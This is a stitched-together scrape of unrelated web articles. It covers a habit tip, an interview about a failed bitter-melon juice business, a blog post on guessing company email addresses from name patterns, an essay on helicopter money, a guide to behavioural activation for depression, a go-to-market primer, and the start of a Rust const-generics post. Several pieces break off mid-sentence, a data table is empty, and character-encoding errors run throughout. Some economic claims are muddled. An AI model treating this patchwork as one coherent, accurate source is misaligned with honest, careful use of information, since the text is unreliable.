<li><p>As long as the feeling of accomplishment is excellent (especially if you keep your streak for 365 days), the burden you put on yourself by forcing a habit is even more critical. It can undermine the whole plan – keep in mind you are doing it for fun and profit, not because it is a punishment. If you have to take a break, take it.</p></li></ul>

<p>Build up your habits and more importantly use skills learned, otherwise there is no point of having a habit at all.</p>

		<p>Wit Sumathavanit has recently started to pivot from offline to online entrepreneurship. But before that, he tried to build a juice business in Bangkok.</p><p>We're here to talk about what went wrong with his approach, what were the lessons learned, and how those learnings impacted their process to validate new ideas.</p><!--kg-card-begin: html--><p>
<img alt="Wit Sumathavanit" src="https://phoenixdown.co/content/images/2020/07/bSE6FBmB_400x400.jpg">
</p><!--kg-card-end: html--><h3 id="can-you-tell-us-a-bit-about-your-background-and-what-are-you-currently-working-on">Can you tell us a bit about your background and what are you currently working on?</h3><p>I’m Wit and I’m based in Bangkok. I have a family business in the hospitality and travel industry. I'm on the corporate B2B side, which hasn't been doing much since the pandemic started. I turned myself into the digital business world, where I’m learning to get started with projects and see what happens.</p><p>My first idea was to have a digital marketing service for products, course creators, or any other companies that wanted to advertise. I connected them with newsletters because I believe that newsletters are under-monetized. There are many good newsletter creators out there who are working hard to build an audience, but they don't have a good monetization strategy. The great thing about newsletters is that they are very targeted. It's very powerful because is highly targeted compared to online ads on Facebook or Google. It's a win-win for advertisers to connect with audiences that are relevant to them.</p><p>I'm running a solo <a href="https://www.witwunder.com/">no-code agency</a> now. I'm a freelance for growth tools, database/spreadsheet, and automation.</p><h3 id="how-did-you-come-up-with-the-idea-to-build-your-juice-startup-what-was-the-motivation-behind-it">How did you come up with the idea to build your juice startup? What was the motivation behind it?</h3><p>After a long day of trying to get a ghost restaurant off the ground, my brain made the connection to something that might have untapped market potentials: Asian bitter melons. I tried a plain bitter melon drink and choked. It’s named “bitter melons” because they’re so darn bitter. It’s one of those foods that scientifically proven to lower blood sugar and a host of other health benefits.</p><p>A quick maths in my head revealed that tens of thousands of diabetics and those at-risk would have the need for daily doses of magic lower blood sugar juice. If only someone would be able to make a bitter melon juice that went from choke to death to barely drinkable, it will sell like crazy. I went all-in without validating the idea.</p><h3 id="how-did-you-build-it">How did you build it?</h3><p>It was almost all on the supply side. Thanks to the magic of e-commerce, I could do next-day home delivery of commercial-grade vertical cold press juicer and an excellent horizontal cold press juicer. I spent $2000 on shiny machines to extract natural goodness.</p><p>I spent the next 3 weeks googling juice combinations and recipes. Navigating the messy and inconvenient organic produce ecosystem of Bangkok. Most merchants of “organic produce” don’t know where their stuff comes from. I had sampled liters of fresh juice, which actually produced great results for my body. It was done. I came up with the secret commercial recipe that made bitter melon juice barely drinkable. That wasn’t enough, I came up with more recipes of health-boosting cold press juice. Ginger, turmeric, garlic, and white mugwort to name a few. Turns out those are also not needed because the market is not that big.</p><!--kg-card-begin: html--><p>
<img alt="Bitter Melon Juice" src="https://phoenixdown.co/content/images/2020/07/bittermelon-capsicum-1.jpg">
</p><!--kg-card-end: html--><p>The only way to get my juice to people was to use a delivery app. It turns out the cost of delivering juice is the same as the cost of the juice. I tried to package them as shot. They're very small because they're strong. The pricing doesn't work out because I cannot charge for them as a premium beverage. It's a physical business, the profit margin is not very high because you need manpower and you need to work with fresh ingredients.</p><h3 id="what-were-your-key-levers-to-start-growing-it">What were your key levers to start growing it?</h3><p>I sent samples to selected healthy juice enthusiasts, diabetic-risk people, health-conscious people. The results ranged from “This is actually OK” to “I’d rather not touch it ever again even for free”.</p><h3 id="what-were-the-biggest-challenges-you-had-to-overcome">What were the biggest challenges you had to overcome?</h3><p>To break-even, I needed to sell more than 500 bottles priced at Starbucks espresso. One person can only drink one 80 ml bottle per day. So, I needed to sell to 50 highly committed customers just to not make a loss.</p><!--kg-card-begin: html--><p>
<img alt="Ginger Lime" src="https://phoenixdown.co/content/images/2020/07/ginger-lime.jpg">
</p><!--kg-card-end: html--><h3 id="how-did-you-realize-the-project-was-not-going-in-the-right-direction">How did you realize the project was not going in the right direction?</h3><p>Once I got to the point of calculating how many bottles I had to sell until this became a profitable project. That’s when I decided to pull the plug on the experiment before it got more carried away. Watching interviews of long-standing juice businesses in the space revealed that people with $50,000+ worth of juice machines serving several hundreds of bottles daily are very passionate about juice. They began with sizeable volume from day 1 because they have been hobbyist juicers who have been documenting their juicing for years before doing it commercially. The juice community sees them as influencers. They had relationships with customers from day 0.</p><blockquote>If I pursue it further I would have a new hobby, but I don't see it as a business.</blockquote><h3 id="did-you-achieve-any-revenue-in-the-end-how-much-money-did-you-lose">Did you achieve any revenue? In the end, how much money did you lose?</h3><p>I made $300 and the cost of the equipment was around $3,000. If I went forward, labor and shipping would probably have been a lot worse than that. After all, I lost at least $3,000 for the project.</p><h3 id="if-you-had-the-chance-to-start-over-what-would-you-do-in-a-different-way">If you had the chance to start over, what would you do in a different way?</h3><p>I would try to make an MVP first. Set up a Facebook or Instagram page and see if they're interested in healthy juices with a strong taste. Reach out to diabetic communities to see if they have an interest in juices like the one I made. I would have known people would prefer taking their current medication rather than a juice too difficult to drink.</p><p>Instead of 3 weeks of mixing juice, I should have spent 3 weeks of market research on juice enthusiasts in Bangkok and validating my assumptions directly with diabetic potential customers.</p><h3 id="from-all-your-takeaways-you-learned-from-this-experience-what-advice-do-you-have-for-other-entrepreneurs-who-want-to-get-started-or-are-just-starting-out">From all your takeaways you learned from this experience, what advice do you have for other entrepreneurs who want to get started or are just starting out?</h3><p>My main takeaway is to have customers from day 0. Call it pre-launch audience building, content marketing, whatever. It’s about having relationships as early as possible and nurture them.</p><blockquote>Solutions do not equal demand. Just because a healthy option is available doesn’t mean that people will choose it.</blockquote><p>Make a landing page and see if there's the problem that I'm looking to solve. Many of my ideas will not make any revenue but my cost of starting is zero. I can try out ideas fast. If my ideas fail, it’s fine because I’m not attached to it. We're not the ones to decide if ideas are good or not, it’s the market.</p><p>Validate your idea. Put it out there and see what happens. If it doesn't work out is fine too, because a lot of successful people failed the first time.</p><h3 id="what-are-your-favorite-startup-resources-for-makers-and-entrepreneurs">What are your favorite startup resources for makers and entrepreneurs? </h3><p><a href="https://nocodemvp.com/">NoCodeMVP</a> made by <a href="https://twitter.com/bramk">Bram Kanstein</a>. It's actually 70% MVP and 30% no-code. I learned how to validate ideas from it.</p><h3 id="where-can-we-go-to-learn-more">Where can we go to learn more?</h3><ul><li><a href="https://www.builderssun.com/starting-with-a-product-my-juicy-3000-mistake/">Here’s a post</a> where I wrote about the story.</li><li>You can find me on <strong><a href="https://twitter.com/WitSuma">Twitter</a></strong>.</li></ul><p><em>If you enjoyed it perhaps like or retweet the thread on Twitter:</em></p><figure><blockquote data-width="550"><div lang="en" dir="ltr"><p>We all know juice is a healthy drink.

				<p>Almost any business that has an online presence and website will have numerous email addresses associated with them. Personal employee addresses, utility addresses, role based addresses, the list goes on. To put it simply, there is a mind boggling amount of email addresses that exist. If you have ever spent a decent amount of time visiting company websites or social media profiles, you might have noticed that many of these addresses share very similar qualities to completely unrelated addresses at completely unrelated businesses. The reason for this is that throughout a majority of the business to business (B2B) space, many companies have adopted very similar habits when creating email addresses for whatever purpose they need.</p><p>These patterns are commonly referred to as “Email Patterns” specifically, as there is a clear trend in what type of handles are used for specific purposes. Knowing what these handles are and what variants are the most common can be extremely useful to be aware of since knowing what possible patterns exist can allow you to potentially discover the email address of a specific contact or role based address at a company. Through trial and error paired with an email verification service, this potentially can allow you to make contact with the exact person you need to for whatever reason you may have.</p><p>In this article, we will be listing out the most common email patterns that exist online. To be as transparent as possible about the nature of this blog post, this information has been analyzed and extracted from the technology we utilize at <a href="https://companywell.co/">Companywell</a>. Considering that we crawl millions of web pages per day, alongside processing more than a million email addresses into our database, we have been able to break down which email patterns specific companies utilize, as well as be able to develop our own metrics based upon the extremely large dataset that we have accumulated through our efforts. Let’s explore our findings together.</p><h3 id="what-is-an-email-pattern">What Is An Email Pattern?</h3><p>To make sure that we are all on the same page before going over our data, let's explore what exactly an ‘email pattern’ is. An email pattern is essentially a manner in which an organization will consistently create email address handles in the same format. If a business hires a new employee and they need to create an email address for them, they will simply be able to create a handle for them that falls in line with other employees so that they are all consistently similar to each other. As an example, say a business hires somebody named John Doe. Depending on what patterns they utilize, they will simply just create a ‘john.doe@domain.com’ or a ‘j.doe@domain.com’ email address for them depending on what they have done in the past for employees.</p><p>A question you may be asking yourself is why would a majority of businesses follow the same type of guidelines when there is no real reason for doing so? To again put it as simply as possible, this usually tends to be the easiest solution for whatever department is responsible for creating and distributing these email addresses internally. Utilizing commonly used email patterns streamlines the process of creating new emails greatly, as you do not need to think about what to make a handle when the time comes. It also just makes internal communication much easier when an employee needs to communicate with another department or individual in the company, but has never been sent their email address. They can simply just follow the format and instantly connect with them without the need to look it up manually.</p><h3 id="the-most-common-email-patterns-in-the-b2b-space">The Most Common Email Patterns In The B2B Space</h3><p>Now that we are all on the same page, below we have listed out the 20 most common email patterns used in the B2B space. These metrics are coming straight from our database at the time of publication of this blog post (As we crawl millions of web pages a day and accumulating more and more email addresses as time goes on, the order of these patterns may not be accurate a year from now).</p><!--kg-card-begin: markdown--><table>

<!--kg-card-end: markdown--><p>It’s not much of a surprise that many of these patterns appear to be essentially the same with a few variations. Almost every business within the B2B space wants an address to immediately be known as belonging to an individual within the company. The only differential factor in these 20 patterns is how they choose to differently represent them. Sometimes companies prefer just using abbreviations of names for accounts, others like to mix them up a bit based upon the name, others separate names in such a way that make it much more apparent at a glance what their name is.</p><h3 id="why-care-about-this">Why Care About This?</h3><p>To put it as bluntly as possible, this blog post should be utilized moreso as a resource to keep in your bookmarks if you ever need to figure out someone's email address at a business. Most likely (unless you are us), you will never need to find a contacts email address on a daily basis, but I am positive that there have been certain situations in your professional life where you needed to find someone's contact information and was unable to discover it online or managed to lose track of it over a certain period of time.</p><p>Since one of the most critical methods of communication within the B2B space is email, having this knowledge in the back of your mind can come in handy in a multitude of ways. Let's look into how you can utilize this information to its max potential in your career.</p><h3 id="how-to-utilize-this-information">How To Utilize This Information</h3><p>The primary manner in which to utilize these patterns is to use trial and error to guess at a desired contacts email address. There is a lot of use out of pulling peoples names out of their email address if they do not have a correctly configured footer that displays their information, but realistically this type of information you either have beforehand or can easily find by searching their email via Google. However, being able to guess at a contacts email address is an extremely useful tool to have up your sleeve as depending on the circumstance this can directly put you in contact with someone when you would otherwise have to reach out to them through other means such as <a href="https://twitter.com/">Twitter</a> or <a href="https://blog.companywell.co/p/d88412b7-2ee5-4359-beaa-cc72cb43382a/linkedin.com">Linkedin</a> (which is not a bad avenue but as many of us who are not dialed into our social media presence as often as we should be, these types of outreach efforts can be not seen or forgotten pretty easily).</p><p>Below I have outlined the manner in which I have personally utilized pattern recognition based email identification in the past. This workflow is by no means the only way you can utilize this info but this is what I have had the most success with in the past.</p><ol><li>Take the {first} and {last} of a contact you wish to reach</li><li>Get the domain of their current place of employment</li><li>Format this data into all 20 patterns (I.E a contact named ‘john doe’ you would take the first name ‘John’ and the last name ‘Doe’ and replace it in the patters as you would see in a common email format)</li><li>Utilize a verification service to see which pattern comes up as valid</li></ol><p>Unfortunately, this process does come with some caveats due to the existence of email servers configured as “catch all” inboxes, where any type of verification can be marked incorrectly due to these types of servers accepting any type of mail that gets sent to them (If you want some incite on which verification services perform the best, I have previously written an article where <a href="https://blog.companywell.co/the-best-email-verification-services-20-services-tested/">I have tested out 20 of the biggest verification services that you can check out here</a>). When you encounter any type of catchall server, unfortunately this workflow isn’t going to necessarily work. However, there is a workaround solution that can potentially allow you to still figure out the correct email address.</p><p>Below I have laid out what I do when I do encounter a Catch All server when attempting to find a specific contact email. I want to stress that you should only take the time to do this if the other workflow above does not work as intended based upon how the email server is configured.</p><ol><li>Take the {first} and {last} of a contact you wish to reach</li><li>Get the domain of their current place of employment</li><li>Format this data into all 20 patterns (I.E a contact named ‘john doe’ you would take the first name ‘John’ and the last name ‘Doe’ and replace it in the patters as you would see in a common email format)</li><li>Take each email address pattern you generated for this contact, then perform a google search of it wrapped up in quotation marks (I.E take a <a href="mailto:johndoe@domain.com">johndoe@domain.com</a> email address and perform a google search of “johndoe@domain.com”</li><li>Go through the first page of results and see if this email address comes up exactly as you typed it. Some Google results will show something similar or break off the handle and show you the name, but what you are looking for is an exact match to what pattern you searched.</li><li>If you cannot locate the email address on the page, move on and proceed to searching the next email address. If you can confirm that the exact email address is on a page and that its location makes sense to where it would be posted, than congratulations you most likely just located their email address.</li></ol><p>In general, I honestly do not suggest this method but I did want to put this process out there as I have successfully found and made contacts with individuals by performing this exact process, so maybe somebody out there can get use out of it like I have in the past. But aside from that, this is a process that takes up a lot of time and unfortunately, doesn’t yield the best results normally. But it can work for the right circumstances.</p><p>There are definitely other ways in which you can utilize this information to the betterment of your needs. Due to the nature of patterns and being able to utilize data sources like CRM’s or lists of contacts from …</p></section></div>

<p><span><span>Reading Time: </span> <span>3</span> <span>minutes</span></span></p><p>Slowly but surely, Helicopter Money’s time is approaching and we better enjoy this experiment. The coronavirus pandemic, which is an absolute black-swan phenomenon, has forced governments and central banks to take measures that have a direct impact on the economy.</p>
<p>So, what could be more aggressive than distributing money to the public in order to keep the wheels of the economy turning? Is it the right time and what is the long term impact of this monetary policy?</p>
<h2><em><strong>First, What is Helicopter Money?</strong></em></h2>
<p>Helicopter money is a term coined by Milton Friedman and refers to a large sum of new&nbsp;money that is distributed to the public in order to stimulate the economy during a recession. In simple terms, when the economy is in a&nbsp;liquidity trap, Helicopter money is an unconventional monetary policy although, in the past two decades, it has been the standard policy of most developed countries worldwide.</p>
<h2><em><strong>How does Helicopter Money really work?</strong></em></h2>
<p>Well, obviously there is no ‘real’ helicopter that drops money from the sky but the term is being used as a metaphor for distributing funds to citizens. In reality, the funds will be automatically deposited in citizens’ bank accounts.</p>
<p>Nowadays, some economists propose that it’s time to use Helicopter money’ to stimulate the economy and more importantly, enable people to meet their basic needs.</p>
<p>This can be attributed to the alleged ‘success’ of central banks following the 2008 economic crisis that has strengthened the opinion of those who believe in government interventions, whether by monetary or fiscal policy. The Quantitative Easing (QE), which is a form of monetary policy in which a central bank purchases securities in order encourage lending and investment (or in other words, printing money), has been adopted by a number of central banks and is considered by many as the best solution for an economic recession.</p>
<h2><em><strong>Coronavirus and Helicopter Money – Can it work?</strong></em></h2>
<p>Fiscal interventions are a powerful tool but also extremely risky. Many countries have suffered from printing and distributing money to the public and thus, creating inflation and hyperinflation. Central banks have the ability to create money in the form of currency or provide credit to banks and businesses. But eventually, the United States is the only country in the world able to print U.S. dollars as its currency is used internationally and it would not significantly affect the value of the currency.</p>
<p>Essentially, governments have the power to print money, however, over-printing ends up cheapening the currency and may create even bigger problems that can end up with the worst scenario of the total valuelessness of the currency and the loss of the public confidence in the issuing government. This may be the doom scenario for the economic system as we know it and requires a restart of the whole system.</p>
<p>This does not come as a surprise. The risk of high inflation, high debts, and the loss of public confidence in the concept of money is out there and is highly possible. Since the coronavirus has entered our lives, many wonder about the concept of money and the economic cycle in general. Some also suggest a <strong><a href="https://www.allinallspace.com/coronavirus-is-it-the-right-time-to-stop-global-economy-and-financial-markets/" target="_blank" rel="noopener noreferrer">total shutdown of the global economy due to the coronavirus pandemic</a></strong>.</p>
<p>But measures to deal with the current crisis must be taken and so far, a limited number of countries have already made a first and second round of stimulus checks and this policy is expected to continue.</p>
<p>Ultimately, money is a man-made concept, which means we can do whatever we want. The free&nbsp;economy is a trial-and-error system where government, central banks, businesses, and individuals try different policies and methods to reach the ultimate system. The bizarre situation caused by the coronavirus pandemic can create a change in our global economic system. Perhaps the coronavirus pandemic can lead to full adoption of the <strong><a href="https://www.allinallspace.com/universal-basic-income-why-it-would-or-wouldnt-work/" target="_blank" rel="noopener noreferrer">Universal Basic Income</a></strong> policy to ensure that people are able to meet their most essential needs.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>When you feel low or fed up, itâ€™s tempting to shut down and do very little. You might cancel activities and social events, and choose passive options instead, such as staying in bed or watching TV. Itâ€™s easy to understand why this happens: when you feel down or depressed, even simple tasks take a lot of effort and energy. It can also be distressing if things arenâ€™t as enjoyable as they used to be.</p><p>Of course, during the COVID-19 pandemic, many people have had their activities and social events cancelled for them. For anyone experiencing depression or low mood, these restrictions will have compounded their desire to withdraw, and the prospect of coming out of lockdown might feel daunting. But, paradoxically, one of the most effective ways to improve a low mood is to do the very things you donâ€™t feel like doing.</p><p>In 1973, the American behavioural psychologist Charles Ferster <a href="https://psycnet.apa.org/doiLanding?doi=10.1037%2Fh0035605" target="_blank">noticed</a> that people who feel low tend to do less. In particular, they engage in fewer activities that bring them enjoyment or meaning. He argued that this drop in activity could be an important factor in understanding and treating depression. His observations provided the foundation for his behavioural model of depression, which still informs our understanding of the condition today.</p><p>According to behavioural approaches, depression is the result of a problematic cycle between reduced activity and low mood. The cycle begins when a person starts doing less, which means that they become more withdrawn and isolated. This, in turn, leads to fewer opportunities for positive experiences or distraction, exacerbating a personâ€™s low mood. This makes the person even less motivated to try effortful, interesting activities, and the cycle continues.</p><p>This negative cycle doesnâ€™t come out of nowhere; it often starts for a clear reason. The low mood seen in depression is often preceded by â€˜a big context shiftâ€™, says Dean McMillan, professor of clinical psychology at Hull York Medical School and the University of York. This shift is caused by a significant change in circumstances, such as a divorce, a demanding period at work â€“ or a global pandemic. The context shift means that the activities a person used to enjoy become difficult or impossible. For example, after a divorce, people might find it upsetting to go to places they used to enjoy with their partner, or a student under pressure at university might be too tired to try once-loved hobbies. Similarly, after the prolonged isolation and inactivity of lockdown, previously enjoyed routines might be challenging or unappealing.</p><p>The risk then is that people withdraw further. They choose easy but unrewarding behaviours instead, such as staying at home (even as lockdown is lifted or as new social opportunities arise). At first, this makes good sense. â€˜This withdrawal is driven by peopleâ€™s desire to avoid the negative emotions that theyâ€™re experiencing when they try to do these activities,â€™ according to David Richards, a professor of mental health services research at the University of Exeter. McMillan agrees, adding that this behaviour â€˜works in the immediate term because it makes you feel betterâ€™. The difficulty lies in what this inactivity sets up in the long term. The risk, he says, is that â€˜it moves you further from what you need to do to get something out of the worldâ€™.</p><p>The key to relieving depression, according to behavioural approaches, is to somehow break this cycle of inactivity and low mood. This is the main goal of the behavioural treatment that the American psychologist Peter Lewinsohn and his colleagues began developing in the 1960s. Today, this approach is known as behavioural activation (BA) and is well-established as an <a href="https://www.cambridge.org/core/journals/psychological-medicine/article/looking-beyond-depression-a-metaanalysis-of-the-effect-of-behavioral-activation-on-depression-anxiety-and-activation/F4B92EAA32F7949A958A1147B6D5B480" target="_blank">effective</a> psychological therapy for depression.</p><p>In BA, people experiencing depression are gradually encouraged to engage in the very activities they have stopped doing. The idea is that the cycle of inactivity and low mood is replaced with a more beneficial cycle in which productive, meaningful activities make people feel better, which in turn increases motivation for more activity. One participant from a research <a href="https://www.sciencedirect.com/science/article/pii/S2214782914000396" target="_blank">study</a> about BA described the process: â€˜I think [BA] helped me a lot because then I started to take care of some stuff and got it done. Just the happy feeling that you get when you have managed to accomplish your goal.â€™</p><p>BA is a standalone treatment, but its principles often appear in other forms of therapy, including cognitive behavioural therapy (CBT). In fact, in one <a href="https://www.ncbi.nlm.nih.gov/pubmed/27461440" target="_blank">study</a> comparing different types of therapy, BA was just as effective at reducing depression as full CBT. Although BA was originally developed as a therapist-led treatment, it involves simple principles that you can implement yourself to improve your mood.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p><strong>Monitor what you do each day.</strong> The first step involves keeping a record of all your activities for about a week. There are free worksheets available <a href="https://www.getselfhelp.co.uk/docs/ActivityDiary.pdf" target="_blank">online</a>, but you can make one yourself. Draw up an empty timetable, splitting each day into hourly slots or into morning, afternoon and evening. Then, for a week, make a note of what you did each day. Critically, you should also make a note of how you felt during each activity, from 0 (feeling really down) to 10 (feeling positive and upbeat). For example, you might note that you watched TV in the morning and your mood was about a 3, then you did a yoga class in the afternoon and your mood was about a 5. â€˜The idea is that this step helps gather information about the small changes in behaviour that could make a big difference but that we often overlook,â€™ says Laura Pass, a clinical psychologist at the University of East Anglia.</p><p>If the idea of tracking your activities for a full week seems daunting, then you could do it for less time. â€˜The aim is to set the recording-activities step at a level that is manageable for the person,â€™ says Pass. â€˜So this might be doing one day, or doing a few time-points during the week.â€™ She stresses that this step can be tailored to the individual: â€˜For example, for a young person, a parent might help them complete this.â€™</p><p>If the idea of tracking your behaviour at all seems too hard, BA principles could still be useful to you â€“ just skip this step and go to the â€˜Make a planâ€™ step below. â€˜Personally, I donâ€™t think itâ€™s absolutely essential to do the baseline activity,â€™ Richards says. Pass agrees, emphasising that the key is about changing future behaviour. â€˜So if someone is able to do that without recording their activity, thatâ€™s still positive.â€™</p><p><strong>Evaluate what you did.</strong> If you tracked your activities and mood, then reflect on what you were doing when your mood was higher. It doesnâ€™t matter if your mood was never very high; thatâ€™s common, particularly if youâ€™ve had a prolonged period of feeling down or depressed. A small increase in mood is still helpful and will inform the next step.</p><p><strong>Make a plan for the following week.</strong> Now you need to schedule activities for the upcoming week, using the same blank worksheet as before. Look back at your diary from the previous week, and include in your schedule the activities you were doing when you experienced a slightly better mood. In addition, try to include some of the activities you have stopped doing, or are doing less often now. You donâ€™t need to fill out every slot, but aim to schedule at least one or two activities for each day.</p><p>To figure out the kind of things you should include, itâ€™s useful to think about not just what you enjoy but also what you find meaningful or important â€“ or what you used to, before this period of low mood or lockdown. â€˜The idea is to personally identify whatâ€™s important to you in your life,â€™ says Pass. â€˜Itâ€™s about where you want your life to be going.â€™ If you enjoy going out with friends, for example, you could invite someone to go for a coffee, or make plans to call a friend. If you value learning, you could plan to take a book out of the library or listen to a new podcast. There isnâ€™t a set list of activities youâ€™re supposed to try; schedules for a school-age teenager, a working parent and a pensioner might vary considerably. What matters to you will depend on your own unique circumstances.</p><p>There might be some less fun things in your schedule, too. If itâ€™s important for you to have a tidy house or flat, for example, you might want to schedule some cleaning or a clearout. McMillan emphasises that itâ€™s about finding a balance between three different types of activity: the pleasurable (such as seeing a friend), the routine (showering, cooking) and the necessary â€“ where the consequences of not doing an activity are significant (academic work, paying bills). â€˜It isnâ€™t just about doing nice things,â€™ he says. â€˜Itâ€™s just as important to get up and brush your teeth and have a bath. Itâ€™s about doing things that get you something positive in life.â€™</p><p>In your new schedule, avoid prolonged periods of not doing very much. In particular, be on the lookout for anything from the previous week that helped you to avoid or escape more fulfilling activity. For example, you might have stayed in bed late so you would miss a certain meeting at work, or spent hours scrolling through social media instead of going out with friends or chatting to them on Zoom. Even though these low-effort behaviours might feel appealing in the moment, they could be maintaining your low mood. This is because, when you do these activities, theyâ€™re filling up time that you could otherwise spend doing something positive. Doing very little at home or choosing to relax arenâ€™t problematic behaviours in and of themselves; they become problematic only if youâ€™re using them to avoid doing something more important. Try to spot any behaviours that you use to withdraw from the world, and avoid scheduling these for the following week.</p><p><strong>Stick to the plan, even when you donâ€™t feel like it.</strong> A key aspect of BA is that you need to carry out all your …</p></div></div></section></div></div>

<p>Most product launchers have difficulties when entering the market with a new offering. Only 40% of new products reach target customers. 60% manage to bring some profit, <a href="https://learn.g2.com/product-launch-statistics">according to the Marketing Research Association</a>. With these statistics in mind, let's explain the go-to-market strategy to ease the founder's job.</p>

<h2>What is the go-to-market strategy?</h2>
<div><p>Go-to-market strategy (or GTM strategy) is a plan of how a product will reach its audience.</p><p>As a rule, it defines the following:</p></div>
<ul>
<li>What specific value a product provides (Why are you creating it?)</li>
<li>Who are you targeting (Who is your ideal customer?)</li>
<li>How do you attract new customers and make them your loyal users? (distribution model, channels, and success metrics)<p>Thus, we can illustrate it like this.</p></li>

<p>A go-to-market strategy is different from a business plan and a marketing strategy. Even though all three are critical for successful company growth, go-to-market has wider adoption. It also refers to launching a new service or entering a new market by an existing company.</p>

<h2>Why do you need a go-to-market strategy?</h2>
<p>As a startup, you plan your resources carefully to reduce risks. Resources include costs, time, and employees necessary to create and maintain your product.Â&nbsp;</p>
<p>A GTM strategy may help you with it, serving as an action plan for a new product release. It assures that the offering meets the user's pain points, and has a proper distribution strategy. You can share it within your agency or with other stakeholders to ensure that everyone is on the same page.</p>

<h2>How to build a go-to-market strategy for startups?</h2>
<p>Â&nbsp;</p>
<h3>1. Set your target audience and customer persona(s).</h3>
<p>Not everyone needs your product, and that is okay. What you need to know is the target audience benefitting the most from your offer. <a href="https://marketinginsidergroup.com/strategy/5-reasons-buyer-personas-arent-good-enough/f">A study reveals that 93% of agencies exceeding profit objectives use segmented customer personas</a>. You can study and segment your audience in several methods:</p>
<ul>
<li>direct customer interviewsÂ&nbsp;</li>
</ul>
<p>Having conversations with your target audience can bring you unexpected insights. Based on this, you can ask for references for further interviews and get more results.</p>
<ul>
<li>surveys &amp; questionnaires</li>
</ul>
<p>Anonymous surveys &amp; tools can help you reach a diverse audience and get to know their pain points.</p>
<ul>
<li>available industry reports by research agencies or public institutions;Â&nbsp;</li>
</ul>
<p>This method takes the fewest effort, but it gives no guarantee that the data will be relevant to your case.</p>

            <div>
                <div>
                    
    
<p>As you build up your customerâ€™s portrait, specify the following points:</p>
<ul>
<li>demographics</li>
<li>geography</li>
<li>job position</li>
<li>psychographics</li>
<li>problems faced</li>
<li>behavior patterns</li>
<li>devices used</li>
</ul>
<p><a href="https://us.epsilon.com/pressroom/new-epsilon-research-indicates-80-of-consumers-are-more-likely-to-make-a-purchase-when-brands-offer-personalized-experiences">Epsilon reports that 80% of users are more inclined to purchase a product if a brand offers personalized user experience</a>. Thus, the more in-depth data you get about your customers, the easier it is to convert them with the right messaging. </p>
<p>Sometimes it takes more than one person to make a decision, especially if you are creating a B2B product. Harvard Business Review claims that on average <a href="https://hbr.org/2017/03/the-new-sales-imperative">6.8 people take part in B2B purchase decisions</a>. This prolongs and complicates the buying process. In this case, you have to know the goals, motivations, and role of every stakeholder involved. Adjust your messaging &amp; value proposition to answer customer needs and close more offers.</p>

<h2>2. Set your value proposition</h2>
<p>Now that you understand your target users, define the value you can offer to them. Instead of listing the product features, identify its benefits for customers.Â&nbsp;</p>
<p>You can do this with a three-column matrix, viewing how exact product features help to solve specific customer problems.</p>

<h2>3. How do you reach your users?</h2>
<p>Now you studied your target audience, created value propositions and messaging. It is time to plan the distribution.</p>
<p>Let's say you target real estate agents. These users may read Inman and Mashvisor to check industry news, but not use Facebook at all. When choosing a software tool, they compare the client's reviews and pricing. Thus, learn their behavior and choose your distribution channels accordingly. You can read industry reports, and follow best practices. Google Trends and Statista are efficient tools, to begin with.</p>
<p>Here are some of the distribution channels you may use:</p>
<ul>
<li>website &amp; blog</li>
<li>physical office</li>
<li>events &amp; webinars</li>
<li>partnerships with influencers</li>
<li>social media &amp; forums</li>
<li>product listings</li>
<li>Google Ads, LinkedIn ads, Facebook ads</li>
</ul>
<p>It is worth testing your tactics and scaling on what works best for your product.</p>

<p>Make sure you have a clear strategy to follow. Marketing &amp; sales strategies should also align with your business goals and target customers. These are some of the digital marketing tactics you might consider for your product:</p>


                    
    
<ul>
<li>
<h3><strong>Partnerships</strong></h3>
</li>
</ul>
<div><p>They also refer to indirect selling. By leveraging the brands and public people trusted by your audience, you can grow your conversion rates. </p><p>For example, Anaplan launched a cloud financial planning solution through established partnerships. Through the well-planned referral program, the company expanded its market reach.</p><p><em>â€œThe customers are looking for a range of skills, and obviously Anaplan knows its products very well, but our partners bring so much more to the party. You hear a lot of people talking about change management and redesigning processes â€¦ - partners bring that and deep industry expertise,â€œ - Clarke, the CEO at Anaplan</em></p></div>
<p>Â&nbsp;</p>


                    
    
<ul>
<li>
<h3>SEO (search engine optimization) &amp; content marketing</h3>
</li>
</ul>
<p>Content &amp; SEO can help you nurture your cold audiences, turning them into your hot leads.</p>
<p>For example, a tax automation agency TaxJar benefited from content in its go-to-market strategy. Due to the lack of expert educational content, the company saw an opportunity. It built authority &amp; trust by creating evergreen content on sales taxing for its audience.Â&nbsp;</p>
<p><em>â€œAnother opportunity for us was our ability to educate the world on sales tax. Therefore, we decided to build the best content we could to help people wrap their heads around sales tax, which feels like an insane problem changing all the time. </em><em><br></em><em><br></em><em>This also helped us succeed through word of mouth, which has been a tremendous lever for growth.â€� </em></p>
<p><em>TaxJar CEO</em></p>
<ul>
<li>
<h3><strong>Paid ad campaigns</strong></h3>
(Google Search and Media, Twitter Ads, Quora Ads, LinkedIn Ads)</li>
</ul>
<p>These can serve as a powerful enhancement for your content, reaching new customers.</p>
<p>Â&nbsp;</p>
<ul>
<li>
<h3>Public relations (PR)</h3>
</li>
</ul>
<p>Press publications work best to build brand awareness and spread the word, like the Mashvisor or Inman resources cited above. They can also bring sales, with a combination of other methods.</p>
<p>Â&nbsp;</p>
<ul>
<li>
<h3>Email marketing</h3>
</li>
</ul>
<p>This channel works best to convert problem-aware readers in your clients. By nurturing your subscribers with relevant &amp; up-to-date info, you can build trust and develop engaging relationships with subscribers.Â&nbsp;</p>
<p>Backed by the industry data and your audience research, identify the<strong> inbound or outbound </strong>marketing methods you will use. Donâ€™t make such decisions based on guesses, as this may lead to inefficient investments and lost time.</p>


                    
    
<h2><strong>5. Plan your budget, time &amp; resources</strong></h2>
<p>Specify the amount of time &amp; money you are going to spend on each tactic. Itâ€™s advisable to spend at least 3-4 weeks to test every distribution channel. After this time, you can analyze the first results and scale what works best.Â&nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
			<p>It’s hard to believe that its been more than 3 years since I opened <a href="https://github.com/rust-lang/rfcs/pull/2000">RFC 2000</a>, which defined
the const generics for Rust. At the same time, reading the RFC thread, there’s also been a huge
amount of change in this area: for one thing, at the time the RFC was written, const fns weren’t
stable, and consts weren’t even being evaluated using miri yet. There’s been a lot of work over the
years on the const generics feature, but still nothing has shipped. However, I think we have defined
a very useful subset of const generics which is stable enough to ship in the near term.</p>
